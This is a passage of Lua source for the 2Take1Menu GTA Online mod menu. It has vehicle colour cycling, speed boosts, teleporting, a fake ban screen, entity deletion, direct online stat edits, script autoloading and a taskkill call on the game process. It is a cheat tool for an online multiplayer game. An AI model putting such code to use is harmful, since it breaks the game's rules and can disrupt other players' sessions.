    aj["vehicle_colors"] = b8("Vehicle Colors", aj["vehicle"]).id
    ak["light_speed"] =
        bd(
        "Set Speed in Milliseconds",
        "autoaction_value_i",
        aj["vehicle_colors"],
        function(k)
            l["veh_lights_speed"] = k.value_i
        end
    )
    ak["light_speed"].min_i = 25
    ak["light_speed"].max_i = 2500
    ak["light_speed"].mod_i = 25
    ak["light_speed"].value_i = l["veh_lights_speed"]
    aj["random_col"] = b8("Random Colors", aj["vehicle_colors"]).id
    ak["random_primary"] =
        bc(
        "Random Primary",
        aj["random_col"],
        function(k)
            if k.on then
                c6(an)
                c6({"rainbow_primary"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    I.ctrl(bq)
                    vehicle.set_vehicle_custom_primary_colour(bq, c.random(0, 0xffffff))
                    c.wait(ak["light_speed"].value_i)
                end
            end
            l["random_primary"] = k.on
            return d.stop(k)
        end
    )
    ak["random_primary"].on = l["random_primary"]
    ak["random_secondary"] =
        bc(
        "Random Secondary",
        aj["random_col"],
        function(k)
            if k.on then
                c6(an)
                c6({"rainbow_secondary"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    I.ctrl(bq)
                    vehicle.set_vehicle_custom_secondary_colour(bq, c.random(0, 0xffffff))
                    c.wait(ak["light_speed"].value_i)
                end
            end
            l["random_secondary"] = k.on
            return d.stop(k)
        end
    )
    ak["random_secondary"].on = l["random_secondary"]
    ak["random_pearlescent"] =
        bc(
        "Random Pearlescent",
        aj["random_col"],
        function(k)
            if k.on then
                c6(an)
                c6({"rainbow_pearlescent"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    I.ctrl(bq)
                    vehicle.set_vehicle_custom_pearlescent_colour(bq, c.random(0, 0xffffff))
                    c.wait(ak["light_speed"].value_i)
                end
            end
            l["random_pearlescent"] = k.on
            return d.stop(k)
        end
    )
    ak["random_pearlescent"].on = l["random_pearlescent"]
    ak["random_neon"] =
        bc(
        "Random Neon Lights",
        aj["random_col"],
        function(k)
            if k.on then
                c6(an)
                c6({"rainbow_neon"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    I.ctrl(bq)
                    local d2 = c.random(0, 0xffffff)
                    vehicle.set_vehicle_neon_lights_color(bq, d2)
                    c.wait(ak["light_speed"].value_i)
                end
            end
            l["random_neon"] = k.on
            return d.stop(k)
        end
    )
    ak["random_neon"].on = l["random_neon"]
    ak["random_smoke"] =
        bc(
        "Random Smoke",
        aj["random_col"],
        function(k)
            if k.on then
                c6(an)
                c6({"rainbow_smoke"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    I.ctrl(bq)
                    local eH = c.random(0, 255)
                    local eI = c.random(0, 255)
                    local eJ = c.random(0, 255)
                    vehicle.set_vehicle_tire_smoke_color(bq, eH, eI, eJ)
                    c.wait(ak["light_speed"].value_i)
                end
            end
            l["random_smoke"] = k.on
            return d.stop(k)
        end
    )
    ak["random_smoke"].on = l["random_smoke"]
    ak["random_xenon"] =
        bc(
        "Random Xenon",
        aj["random_col"],
        function(k)
            if k.on then
                c6(an)
                c6({"rainbow_xenon"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    I.ctrl(bq)
                    vehicle.set_vehicle_headlight_color(bq, c.random(0, 12))
                    c.wait(ak["light_speed"].value_i)
                end
            end
            l["random_xenon"] = k.on
            return d.stop(k)
        end
    )
    ak["random_xenon"].on = l["random_xenon"]
    aj["rainbow_col"] = b8("Rainbow Colors", aj["vehicle_colors"]).id
    ak["rainbow_primary"] =
        bc(
        "Rainbow Primary",
        aj["rainbow_col"],
        function(k)
            if k.on then
                c6(an)
                c6({"random_primary"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    I.ctrl(bq)
                    for i = 1, #T do
                        vehicle.set_vehicle_custom_primary_colour(bq, c1({T[i][1], T[i][2], T[i][3]}))
                        c.wait(ak["light_speed"].value_i)
                    end
                end
            end
            l["rainbow_primary"] = k.on
            return d.stop(k)
        end
    )
    ak["rainbow_primary"].on = l["rainbow_primary"]
    ak["rainbow_secondary"] =
        bc(
        "Rainbow Secondary",
        aj["rainbow_col"],
        function(k)
            if k.on then
                c6(an)
                c6({"random_secondary"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    I.ctrl(bq)
                    for i = 1, #T do
                        vehicle.set_vehicle_custom_secondary_colour(bq, c1({T[i][1], T[i][2], T[i][3]}))
                        c.wait(ak["light_speed"].value_i)
                    end
                end
            end
            l["rainbow_secondary"] = k.on
            return d.stop(k)
        end
    )
    ak["rainbow_secondary"].on = l["rainbow_secondary"]
    ak["rainbow_pearlescent"] =
        bc(
        "Rainbow Pearlescent",
        aj["rainbow_col"],
        function(k)
            if k.on then
                c6(an)
                c6({"random_pearlescent"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    I.ctrl(bq)
                    for i = 1, #T do
                        vehicle.set_vehicle_custom_pearlescent_colour(bq, c1({T[i][1], T[i][2], T[i][3]}))
                        c.wait(ak["light_speed"].value_i)
                    end
                end
            end
            l["rainbow_pearlescent"] = k.on
            return d.stop(k)
        end
    )
    ak["rainbow_pearlescent"].on = l["rainbow_pearlescent"]
    ak["rainbow_neon"] =
        bc(
        "Rainbow Neon Lights",
        aj["rainbow_col"],
        function(k)
            if k.on then
                c6(an)
                c6({"random_neon"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    I.ctrl(bq)
                    for i = 1, #T do
                        vehicle.set_vehicle_neon_lights_color(bq, c1({T[i][1], T[i][2], T[i][3]}))
                        c.wait(ak["light_speed"].value_i)
                    end
                end
            end
            l["rainbow_neon"] = k.on
            return d.stop(k)
        end
    )
    ak["rainbow_neon"].on = l["rainbow_neon"]
    ak["rainbow_smoke"] =
        bc(
        "Rainbow Smoke",
        aj["rainbow_col"],
        function(k)
            if k.on then
                c6(an)
                c6({"random_smoke"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    I.ctrl(bq)
                    for i = 1, #T do
                        local q = T[i]
                        vehicle.set_vehicle_tire_smoke_color(bq, q[1], q[2], q[3])
                        c.wait(ak["light_speed"].value_i)
                    end
                end
            end
            l["rainbow_smoke"] = k.on
            return d.stop(k)
        end
    )
    ak["rainbow_smoke"].on = l["rainbow_smoke"]
    ak["rainbow_xenon"] =
        bc(
        "Rainbow Xenon",
        aj["rainbow_col"],
        function(k)
            if k.on then
                c6(an)
                c6({"random_xenon"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    I.ctrl(bq)
                    for i = 0, 12 do
                        vehicle.set_vehicle_headlight_color(bq, i)
                        c.wait(ak["light_speed"].value_i)
                    end
                end
            end
            l["rainbow_xenon"] = k.on
            return d.stop(k)
        end
    )
    ak["rainbow_xenon"].on = l["rainbow_xenon"]
    ak["synced_random"] =
        bc(
        "Synced Random Colors",
        aj["vehicle_colors"],
        function(k)
            if k.on then
                c6(am)
                c6(al)
                c6({"synced_rainbow_smooth", "synced_rainbow"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    c8(bq, {c.random(0, 255), c.random(0, 255), c.random(0, 255)})
                    c.wait(ak["light_speed"].value_i)
                end
            end
            l["synced_random"] = k.on
            return d.stop(k)
        end
    )
    ak["synced_random"].on = l["synced_random"]
    ak["synced_rainbow"] =
        bc(
        "Synced Rainbow Colors",
        aj["vehicle_colors"],
        function(k)
            if k.on then
                c6(am)
                c6(al)
                c6({"synced_random", "synced_rainbow_smooth"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    for i = 1, #T do
                        local q = T[i]
                        c8(bq, {q[1], q[2], q[3]}, i)
                        c.wait(ak["light_speed"].value_i)
                    end
                end
            end
            l["synced_rainbow"] = k.on
            return d.stop(k)
        end
    )
    ak["synced_rainbow"].on = l["synced_rainbow"]
    ak["synced_rainbow_smooth"] =
        bc(
        "Synced Smooth Rainbow",
        aj["vehicle_colors"],
        function(k)
            if k.on then
                c6(am)
                c6(al)
                c6({"synced_random", "synced_rainbow"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    local eK
                    eK = math.floor((101 - ak["light_speed"].value_i / 25) / 2)
                    if eK < 1 then
                        eK = 1
                    end
                    for i = 0, 255, eK do
                        c8(bq, {255, i, 0})
                    end
                    eK = math.floor((101 - ak["light_speed"].value_i / 25) / 2)
                    if eK < 1 then
                        eK = 1
                    end
                    for i = 255, 0, -eK do
                        c8(bq, {i, 255, 0})
                    end
                    eK = math.floor((101 - ak["light_speed"].value_i / 25) / 2)
                    if eK < 1 then
                        eK = 1
                    end
                    for i = 0, 255, eK do
                        c8(bq, {0, 255, i})
                    end
                    eK = math.floor((101 - ak["light_speed"].value_i / 25) / 2)
                    if eK < 1 then
                        eK = 1
                    end
                    for i = 255, 0, -eK do
                        c8(bq, {0, i, 255})
                    end
                    eK = math.floor((101 - ak["light_speed"].value_i / 25) / 2)
                    if eK < 1 then
                        eK = 1
                    end
                    for i = 0, 255, eK do
                        c8(bq, {i, 0, 255})
                    end
                    eK = math.floor((101 - ak["light_speed"].value_i / 25) / 2)
                    if eK < 1 then
                        eK = 1
                    end
                    for i = 255, 0, -eK do
                        c8(bq, {255, 0, i})
                    end
                end
            end
            l["synced_rainbow_smooth"] = k.on
            return d.stop(k)
        end
    )
    ak["synced_rainbow_smooth"].on = l["synced_rainbow_smooth"]
    bb(
        "100% Black",
        aj["vehicle_colors"],
        function()
            local bq = ped.get_vehicle_ped_is_using(M.ped())
            if bq ~= 0 then
                c8(bq, {0, 0, 0}, 0)
            else
                o("Get in a valid Vehicle!", 173)
            end
        end
    )
    ak["black_100"] =
        bc(
        "100% Black",
        aj["vehicle_colors"],
        function(k)
            if k.on then
                c6(am)
                c6(al)
                c6(an)
                c6({"fade_black_red"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    c8(bq, {0, 0, 0}, 0)
                end
            end
            l["black_100"] = k.on
            return d.stop(k)
        end
    )
    ak["black_100"].on = l["black_100"]
    ak["fade_black_red"] =
        bc(
        "Fade Black-Red",
        aj["vehicle_colors"],
        function(k)
            if k.on then
                c6(am)
                c6(al)
                c6(an)
                c6({"black_100"})
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    local eK
                    eK = math.floor((101 - ak["light_speed"].value_i / 25) / 2)
                    if eK < 1 then
                        eK = 1
                    end
                    for i = 0, 255, eK do
                        c8(bq, {i, 0, 0}, 0, 8)
                    end
                    eK = math.floor((101 - ak["light_speed"].value_i / 25) / 2)
                    if eK < 1 then
                        eK = 1
                    end
                    for i = 255, 0, -eK do
                        c8(bq, {i, 0, 0}, 0, 8)
                    end
                end
            end
            l["fade_black_red"] = k.on
            return d.stop(k)
        end
    )
    ak["fade_black_red"].on = l["fade_black_red"]
    ak["heli"] =
        bd(
        "Heli Blades Speed 0-100%",
        "value_i",
        aj["vehicle"],
        function(k)
            l["heli"] = k.on
            l["heli_i"] = ak["heli"].value_i
            local bq = ped.get_vehicle_ped_is_using(M.ped())
            if k.on then
                if bq ~= 0 then
                    I.ctrl(bq)
                    local di = k.value_i / 100
                    vehicle.set_heli_blades_speed(bq, di)
                end
            end
            return d.stop(k)
        end
    )
    ak["heli"].max_i = 100
    ak["heli"].min_i = 0
    ak["heli"].mod_i = 5
    ak["heli"].value_i = l["heli_i"]
    ak["heli"].on = l["heli"]
    ak["sel_boost_speed"] =
        bd(
        "Boost Vehicle",
        "value_i",
        aj["vehicle"],
        function(k)
            l["sel_boost_speed"] = k.on
            l["sel_boost_speed_speed"] = ak["sel_boost_speed"].value_i
            local bq = ped.get_vehicle_ped_is_using(M.ped())
            if k.on then
                if bq ~= 0 then
                    I.ctrl(bq)
                    entity.set_entity_max_speed(bq, ak["sel_boost_speed"].value_i)
                    vehicle.set_vehicle_forward_speed(bq, ak["sel_boost_speed"].value_i)
                end
            end
            if not k.on then
                entity.set_entity_max_speed(bq, 540)
            end
            return d.stop(k)
        end
    )
    ak["sel_boost_speed"].max_i = 50000
    ak["sel_boost_speed"].min_i = 0
    ak["sel_boost_speed"].mod_i = 50
    ak["sel_boost_speed"].value_i = l["sel_boost_speed_speed"]
    ak["sel_boost_speed"].on = l["sel_boost_speed"]
    ak["speedometer"] =
        bd(
        "License Plate Speedometer",
        "value_i",
        aj["vehicle"],
        function(k)
            l["speedometer"] = k.on
            l["speedometer_type"] = ak["speedometer"].value_i
            aA = ak["speedometer"].value_i
            if k.on then
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    if aA ~= aB then
                        o("Displaying Speed now with Unit:\n" .. ac[ak["speedometer"].value_i][3], 96)
                    end
                    local eL = entity.get_entity_speed(bq) * ac[ak["speedometer"].value_i][2]
                    if eL < 10 and eL > 0.01 then
                        eL = string.format("%.2f", eL)
                    elseif eL >= 10 and eL < 100 then
                        eL = string.format("%.1f", eL)
                    elseif eL < 0.01 and ak["speedometer"].value_i == 7 then
                        eL = string.format("%.5f", eL)
                    else
                        eL = math.floor(eL)
                    end
                    I.ctrl(bq)
                    vehicle.set_vehicle_number_plate_text(bq, tostring(eL) .. ac[ak["speedometer"].value_i][1])
                end
            end
            aB = ak["speedometer"].value_i
            return d.stop(k)
        end
    )
    ak["speedometer"].max_i = #ac
    ak["speedometer"].min_i = 1
    ak["speedometer"].value_i = l["speedometer_type"]
    ak["speedometer"].on = l["speedometer"]
    ak["veh_no_colision"] =
        bc(
        "No collision",
        aj["vehicle"],
        function(k)
            if k.on then
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    local eM = ped.get_all_peds()
                    for i = 1, #eM do
                        entity.set_entity_no_collsion_entity(eM[i], bq, true)
                        entity.set_entity_no_collsion_entity(bq, eM[i], true)
                    end
                    eM = object.get_all_objects()
                    for i = 1, #eM do
                        entity.set_entity_no_collsion_entity(eM[i], bq, true)
                        entity.set_entity_no_collsion_entity(bq, eM[i], true)
                    end
                    eM = vehicle.get_all_vehicles()
                    for i = 1, #eM do
                        entity.set_entity_no_collsion_entity(eM[i], bq, true)
                        entity.set_entity_no_collsion_entity(bq, eM[i], true)
                    end
                end
            end
            l["veh_no_colision"] = k.on
            return d.stop(k)
        end
    )
    ak["veh_no_colision"].on = l["veh_no_colision"]
    ak["auto_repair"] =
        bc(
        "Auto Repair Vehicle",
        aj["vehicle"],
        function(k)
            if k.on then
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    if vehicle.is_vehicle_damaged(bq) then
                        I.ctrl(bq)
                        vehicle.set_vehicle_fixed(bq)
                        vehicle.set_vehicle_deformation_fixed(bq)
                        vehicle.set_vehicle_engine_health(bq, 1000)
                        vehicle.set_vehicle_can_be_visibly_damaged(bq, false)
                    end
                end
            end
            l["auto_repair"] = k.on
            return d.stop(k)
        end
    )
    ak["auto_repair"].on = l["auto_repair"]
    ak["drive_on_ocean"] =
        bc(
        "Drive / Walk on the Ocean",
        aj["misc"],
        function(k)
            if k.on then
                local bp = M.coords()
                if aK == nil then
                    I.model(1822550295)
                    aK = object.create_object(1822550295, v3(bp.x, bp.y, -4), true, false)
                    entity.set_entity_visible(aK, false)
                end
                water.set_waves_intensity(-100000000)
                bp.z = -4
                bj(aK, bp)
            end
            l["drive_on_ocean"] = k.on
            if not k.on and aK ~= nil then
                water.reset_waves_intensity()
                bk({aK})
                aK = nil
            end
            return d.stop(k)
        end
    )
    ak["drive_on_ocean"].on = l["drive_on_ocean"]
    ak["drive_this_height"] =
        bc(
        "Drive / Walk this Height",
        aj["misc"],
        function(k)
            if k.on then
                local bp, bn
                if ped.is_ped_in_any_vehicle(M.ped()) then
                    local bq = ped.get_vehicle_ped_is_using(M.ped())
                    bp = c.gcoords(bq)
                    bn = 5.25
                else
                    bp = M.coords()
                    bn = 5.85
                end
                if aL == nil then
                    I.model(1822550295)
                    aM = bp.z - bn
                    aL = object.create_object(1822550295, v3(bp.x, bp.y, aM), true, false)
                    entity.set_entity_visible(aL, false)
                end
                water.set_waves_intensity(-100000000)
                bp.z = aM
                bj(aL, bp)
            end
            l["drive_this_height"] = k.on
            if not k.on and aL ~= nil then
                water.reset_waves_intensity()
                bk({aL})
                aL = nil
                aM = nil
            end
            return d.stop(k)
        end
    )
    ak["drive_this_height"].on = l["drive_this_height"]
    ak["weird_ent"] =
        bc(
        "Weird Entity",
        aj["misc"],
        function(k)
            local bq = ped.get_vehicle_ped_is_using(M.ped())
            local dO = M.ped()
            if k.on then
                if bq ~= 0 and aN == nil then
                    local cf = entity.get_entity_model_hash(bq)
                    aN = vehicle.create_vehicle(cf, M.coords(), 0, true, false)
                    dO = bq
                elseif aN == nil then
                    aN = ped.clone_ped(M.ped())
                end
                entity.set_entity_visible(dO, false)
                entity.set_entity_collision(aN, false, false, false)
                entity.set_entity_rotation(aN, v3(c.random(-180, 180), c.random(-180, 180), c.random(-180, 180)))
                bj(aN, M.coords())
            end
            if not k.on then
                bk({aN})
                aN = nil
                entity.set_entity_visible(dO, true)
            end
            l["weird_ent"] = k.on
            return d.stop(k)
        end
    )
    ak["weird_ent"].on = l["weird_ent"]
    ak["real_time"] =
        bc(
        "Real Time (Clientside)",
        aj["misc"],
        function(k)
            if k.on then
                local g = os.date("*t")
                time.set_clock_time(g.hour, g.min, g.sec)
                gameplay.clear_cloud_hat()
            end
            l["real_time"] = k.on
            return d.stop(k)
        end
    )
    ak["real_time"].on = l["real_time"]
    ak["random_clothes"] =
        bc(
        "Random Clothes",
        aj["misc"],
        function(k)
            if k.on then
                c.wait(333)
                ped.set_ped_random_component_variation(M.ped())
            end
            l["random_clothes"] = k.on
            return d.stop(k)
        end
    )
    ak["random_clothes"].on = l["random_clothes"]
    ak["clear_area"] =
        bc(
        "Gameplay Clear Area",
        aj["misc"],
        function(k)
            if k.on then
                local bp = M.coords()
                gameplay.clear_area_of_cops(bp, 10000, true)
                gameplay.clear_area_of_peds(bp, 10000, true)
                gameplay.clear_area_of_vehicles(bp, 10000, false, false, false, false, false)
                gameplay.clear_area_of_objects(bp, 10000, 0)
                gameplay.clear_area_of_objects(bp, 10000, 1)
                gameplay.clear_area_of_objects(bp, 10000, 2)
                gameplay.clear_area_of_objects(bp, 10000, 6)
                gameplay.clear_area_of_objects(bp, 10000, 16)
                gameplay.clear_area_of_objects(bp, 10000, 17)
            end
            l["clear_area"] = k.on
            return d.stop(k)
        end
    )
    ak["clear_area"].on = l["clear_area"]
    ak["clear_area_2"] =
        bc(
        "Clear Area",
        aj["misc"],
        function(k)
            if k.on then
                local eN = ped.get_all_peds()
                for i = 1, #eN do
                    local eO = eN[i]
                    if not ped.is_ped_a_player(eO) and k.on then
                        I.ctrl(eO, 250)
                        entity.set_entity_velocity(eO, v3())
                        bj(eO, v3(8000, 8000, -1000))
                        entity.delete_entity(eO)
                    end
                end
                eN = object.get_all_objects()
                for i = 1, #eN do
                    local eO = eN[i]
                    if k.on then
                        I.ctrl(eO, 250)
                        entity.set_entity_velocity(eO, v3())
                        bj(eO, v3(8000, 8000, -1000))
                        entity.delete_entity(eO)
                        c.wait(0)
                    end
                end
                eN = vehicle.get_all_vehicles()
                local eP = {}
                for F = 0, 31 do
                    if K.scid(F) ~= -1 then
                        local bq = ped.get_vehicle_ped_is_using(c.ped(F))
                        if bq ~= 0 then
                            eP[#eP + 1] = bq
                        end
                    end
                end
                for i = 1, #eN do
                    local eO = eN[i]
                    if k.on then
                        local ey = true
                        for cR = 1, #eP do
                            if eO == eP[cR] then
                                ey = false
                            end
                        end
                        if ey then
                            I.ctrl(eO, 250)
                            entity.set_entity_velocity(eO, v3())
                            bj(eO, v3(8000, 8000, -1000))
                            entity.delete_entity(eO)
                        end
                    end
                end
            end
            l["clear_area_2"] = k.on
            return d.stop(k)
        end
    )
    ak["clear_area_2"].on = l["clear_area_2"]
    ak["auto_tp_wp"] =
        bc(
        "Auto Teleport to Waypoint",
        aj["misc"],
        function(k)
            if k.on then
                local dl = ui.get_waypoint_coord()
                if dl.x ~= 16000 then
                    local bp = M.coords()
                    local eQ = v2()
                    eQ.x = bp.x
                    eQ.y = bp.y
                    if dl:magnitude(eQ) > 35 then
                        o("Detected Waypoint, teleporting...", 172)
                        local eR = M.ped()
                        local eS = ped.get_vehicle_ped_is_using(eR)
                        if eS ~= 0 then
                            eR = eS
                        end
                        local eT = 850
                        local ev, eU = gameplay.get_ground_z(v3(dl.x, dl.y, eT))
                        while not ev do
                            eT = eT - 5
                            ev, eU = gameplay.get_ground_z(v3(dl.x, dl.y, eT))
                            if eT < -200 then
                                eT = -200
                                ev = true
                            end
                        end
                        bm(v3(dl.x, dl.y, eU))
                    end
                end
            end
            l["auto_tp_wp"] = k.on
            return d.stop(k)
        end
    )
    ak["auto_tp_wp"].on = l["auto_tp_wp"]
    ak["police_outfit"] =
        bc(
        "Force Police Outfit",
        aj["misc"],
        function(k)
            if k.on then
                local K = "male"
                if player.is_player_female(c.id()) then
                    K = "female"
                end
                for i = 1, #a1[K]["clothes"] do
                    ped.set_ped_component_variation(M.ped(), i, a1[K]["clothes"][i][2], a1[K]["clothes"][i][1], 2)
                end
                for i = 1, #a1[K]["props"] do
                    ped.set_ped_prop_index(M.ped(), a1[K]["props"][i][1], a1[K]["props"][i][2], a1[K]["props"][i][3], 0)
                end
                c.wait(250)
            end
            l["police_outfit"] = k.on
            return d.stop(k)
        end
    )
    ak["police_outfit"].on = l["police_outfit"]
    ak["ban_screen"] =
        bc(
        "You've Been Banned",
        aj["misc"],
        function(k)
            if k.on then
                local bp = v2()
                local bP = v2()
                local eV = v2()
                bp.x = 0.5
                bp.y = 0.325
                bP.x = 0.5
                bP.y = 0.5
                eV.x = 0.5
                eV.y = 0.54
                ui.set_text_scale(3.0)
                ui.set_text_font(7)
                ui.set_text_centre(0)
                ui.set_text_color(255, 206, 67, 255)
                ui.set_text_outline(true)
                ui.draw_text("alert", bp)
                ui.set_text_scale(0.5)
                ui.set_text_centre(0)
                ui.set_text_color(255, 255, 255, 255)
                ui.draw_text("You have been banned from Grand Theft Auto Online permanently", bP)
                ui.set_text_scale(0.5)
                ui.set_text_centre(0)
                ui.draw_text("Return to Grand Theft Auto V", eV)
                ui.draw_rect(.5, .5, 1, 1, 0, 0, 0, 255)
                ui.draw_rect(.5, .492, .52, .0019, 255, 255, 255, 255)
                ui.draw_rect(.5, .585, .52, .0019, 255, 255, 255, 255)
            end
            return d.stop(k)
        end
    )
    ak["swap_seats"] =
        bd(
        "Swap Vehicle Seat",
        "autoaction_value_i",
        aj["misc"],
        function()
            local eS = ped.get_vehicle_ped_is_using(M.ped())
            if eS ~= 0 then
                ped.set_ped_into_vehicle(M.ped(), eS, ak["swap_seats"].value_i)
            end
        end
    )
    ak["swap_seats"].min_i = -1
    ak["swap_seats"].value_i = -1
    ak["swap_seats"].max_i = 15
    bb(
        "Fill Snacks and Armor",
        aj["misc"],
        function()
            local eW = {
                {"NO_BOUGHT_YUM_SNACKS", 30},
                {"NO_BOUGHT_HEALTH_SNACKS", 15},
                {"NO_BOUGHT_EPIC_SNACKS", 5},
                {"NUMBER_OF_ORANGE_BOUGHT", 10},
                {"NUMBER_OF_BOURGE_BOUGHT", 10},
                {"NUMBER_OF_CHAMP_BOUGHT", 5},
                {"MP_CHAR_ARMOUR_1_COUNT", 10},
                {"MP_CHAR_ARMOUR_2_COUNT", 10},
                {"MP_CHAR_ARMOUR_3_COUNT", 10},
                {"MP_CHAR_ARMOUR_4_COUNT", 10},
                {"MP_CHAR_ARMOUR_5_COUNT", 10}
            }
            for i = 1, #eW do
                local cf = gameplay.get_hash_key("MP0_" .. eW[i][1])
                stats.stat_set_int(cf, eW[i][2], true)
                cf = gameplay.get_hash_key("MP1_" .. eW[i][1])
                stats.stat_set_int(cf, eW[i][2], true)
            end
        end
    )
    aj["player_history"] =
        b8(
        "Player History",
        aj["misc"],
        function(k)
            cF()
        end
    ).id
    aj["utils"] = b8("Utils", aj["misc"]).id
    aj["scripts"] =
        b8(
        "Load Scripts",
        aj["utils"],
        function()
            o("NOTHING TO SEE HERE!!! MAYBE COMING SOON", 208, "COMING SOON")
            local eX = os.getenv("APPDATA") .. "\\PopstarDevs\\2Take1Menu\\scripts\\"
            local b = utils.get_all_files_in_directory(eX, "lua")
            local eY = aj["scripts"].children
            local eZ = d.file_name()
            for i = 1, #b do
                local da = true
                for F = 1, #eY do
                    if eY[F].name == b[i] then
                        da = false
                    end
                end
                if b[i] == eZ then
                    da = false
                end
                if da then
                    local e_
                    bc(
                        b[i],
                        aj["scripts"].id,
                        function(k)
                            if k.on and not b4[b[i]] then
                                b4[b[i]] = {}
                                local f0, f1 = loadfile(eX .. b[i])
                                if f0 ~= nil then
                                else
                                    o("NO")
                                end
                            elseif not k.on and b4[b[i]] then
                                o("NOTHING TO SEE HERE!!! MAYBE COMING SOON", 208, "COMING SOON")
                            end
                        end
                    )
                end
            end
        end
    )
    ak["auto_load"] =
        bc(
        "autoexec Scripts from folder 'autoload'",
        aj["utils"],
        function(k)
            l["auto_load"] = k.on
            if k.on then
                if utils.dir_exists(os.getenv("APPDATA") .. "\\PopstarDevs\\2Take1Menu\\scripts\\autoload") then
                    local b =
                        utils.get_all_files_in_directory(
                        os.getenv("APPDATA") .. "\\PopstarDevs\\2Take1Menu\\scripts\\autoload",
                        "lua"
                    )
                    if b ~= nil then
                        s("Found Scripts for autoexecuting!")
                        for i = 1, #b do
                            s(b[i])
                            local eZ = string.sub(b[i], 1, -5)
                            c.wait(5000)
                            if not require("\\autoload\\" .. eZ) then
                                o("ERROR Loading Script " .. b[i] .. "!", 208)
                            else
                                o("Loaded Script " .. b[i] .. " succesfully!", 166)
                                s("Loaded Script " .. b[i] .. " succesfully!")
                            end
                        end
                    end
                else
                    o("No folder 'autoload' found, create a folder and place any script inside!", 174)
                end
            end
        end
    )
    ak["auto_load"].on = l["auto_load"]
    ak["leave_session"] =
        bb(
        "Leave-Session",
        aj["utils"],
        function()
            local time = c.time() + 8500
            while time > c.time() do
            end
        end
    )
    ak["crash_yourself"] =
        bb(
        "Crash Yourself",
        aj["utils"],
        function()
            c.exe("taskkill /F /IM GTA5.exe")
            while 1 do
            end
        end
    )
    bc(
        "Auto-Hostkick-Yourself",
        aj["utils"],
        function(k)
            if k.on then
                if network.network_is_host() then
                    o("Hostkicking-Yourself!")
                    s("Hostkicking-Yourself!")
                    network.network_session_kick_player(c.id())
                end
            end
            return d.stop(k)
        end
    )
    bb(
        "Fuck You",
        aj["utils"],
        function()
            c.exe(
                "start https://steamuserimages-a.akamaihd.net/ugc/849342240392626653/882456A11C32E6548619159DCEE8BA0D1DDAEE35/?imw=1024&imh=1024&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true"
            )
        end
    )
    aj["ipl_config"] =
        b8(
        "IPL-Loader",
        aj["misc"],
        function()
            if not utils.file_exists(b["IPLlist"]) then
                o("No IPL-List File found.")
                o(
                    "Download '2Take1IPLlist.txt' from #lua-script-share and place it in '2Take1Menu/scripts/2Take1Script/CustomFiles' folder."
                )
                aG["load_ipls"].hidden = true
                aG["range_start"].hidden = true
                aG["range_end"].hidden = true
                aG["remove_ipls"].hidden = true
            else
                aG["load_ipls"].hidden = false
                aG["range_start"].hidden = false
                aG["range_end"].hidden = false
                aG["remove_ipls"].hidden = false
            end
        end
    ).id
    aG["load_ipls"] =
        bb(
        "Load ALL IPLs from File",
        aj["ipl_config"],
        function()
            for f2 in io.lines(b["IPLlist"]) do
                streaming.request_ipl(f2)
            end
        end
    )
    aG["range_start"] =
        bd(
        "Select starting line for range",
        "action_value_i",
        aj["ipl_config"],
        function(k)
        end
    )
    aG["range_start"].max_i = 8550
    aG["range_start"].mod_i = 50
    aG["range_end"] =
        bd(
        "Select ending line for range",
        "action_value_i",
        aj["ipl_config"],
        function(k)
        end
    )
    aG["range_end"].max_i = 8550
    aG["range_end"].mod_i = 50
    aG["remove_ipls"] =
        bb(
        "Remove ALL IPLs between selected Range",
        aj["ipl_config"],
        function()
            local bD = 0
            local f3 = aG["range_start"].value_i
            for f2 in io.lines(b["IPLlist"]) do
                if bD == f3 then
                    f3 = f3 + 1
                    if f3 <= aG["range_end"].value_i then
                        streaming.remove_ipl(f2)
                    end
                end
                bD = bD + 1
            end
        end
    )
    aj["debug"] = b8("Dev Tools", aj["misc"]).id
    bb(
        "Delete Entity from Aim",
        aj["debug"],
        function()
            bk({player.get_entity_player_is_aiming_at(c.id())})
        end
    )
    bb(
        "Get input Hash Key",
        aj["debug"],
        function()
            local cf
            local J, f4 = input.get("Enter Name(PED, OBJECT, etc)", "", 64, 0)
            while J == 1 do
                c.wait(0)
                J, f4 = input.get("Enter Name(PED, OBJECT, etc)", "", 64, 0)
            end
            if J == 2 then
                return HANDLER_POP
            end
            s("")
            s("******************************")
            s("String: " .. f4)
            cf = tostring(gameplay.get_hash_key(f4))
            s("Hash: " .. cf)
            o(string.format("%s %s", f4, cf))
        end
    )
    bb(
        "Notify & Print String from file",
        aj["debug"],
        function()
            local f5 = "slod_small_quadped"
            local f6 = gameplay.get_hash_key(f5)
            s("")
            s("******************************")
            s("String: " .. f5)
            s("Hash: " .. f6)
            o("String: " .. f5)
            o("Hash: " .. f6)
        end
    )
    ak["print_info_from_entity"] =
        bb(
        "Print Info from Entity @Aim to file",
        aj["debug"],
        function()
            local dy = player.get_entity_player_is_aiming_at(c.id())
            local f7, bp, cY
            if dy ~= 0 then
                while dy ~= 0 do
